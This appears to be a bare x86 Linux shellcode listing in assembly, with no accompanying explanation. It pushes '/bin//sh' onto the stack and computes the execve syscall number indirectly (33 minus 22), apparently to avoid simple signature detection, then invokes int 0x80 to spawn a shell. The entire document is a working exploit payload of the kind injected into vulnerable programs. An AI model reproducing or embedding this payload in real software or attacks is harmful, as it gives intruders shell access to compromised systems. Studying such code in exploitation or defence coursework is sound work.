global _start  
section .text  
  
_start:  
 xor eax,eax
 xchg ecx,eax
 mov edx,ecx
 mov eax,edx
 mov al,33
 push ecx
 push 0x68732f2f   ;; hs//
 push 0x6e69622f   ;; nib/
 mov ebx, esp
 ;push word 0x11
 ;pop eax
 sub al, 22
 int 0x80

